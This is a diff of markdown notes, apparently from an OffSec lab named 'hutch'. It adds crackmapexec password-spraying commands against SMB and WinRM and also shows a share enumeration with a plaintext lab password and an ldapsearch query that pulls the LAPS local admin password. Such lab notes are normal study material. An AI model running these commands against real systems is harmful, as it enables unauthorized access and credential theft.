@@ -26,6 +26,12 @@ used to find the shares on a file system.
 ```
 crackmapexec smb 192.168.105.122 -u fmcsorley -p CrabSharkJellyfish192 --shares
 ```
+```
+crackmapexec smb 192.168.194.165 -u users.txt -p passwords.txt --continue-on-success
+```
+```
+crackmapexec winrm 192.168.194.165 -u users.txt -p passwords.txt --continue-on-success
+```
 used to find the admin password
 ```
 ldapsearch -x -H ldap://192.168.105.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
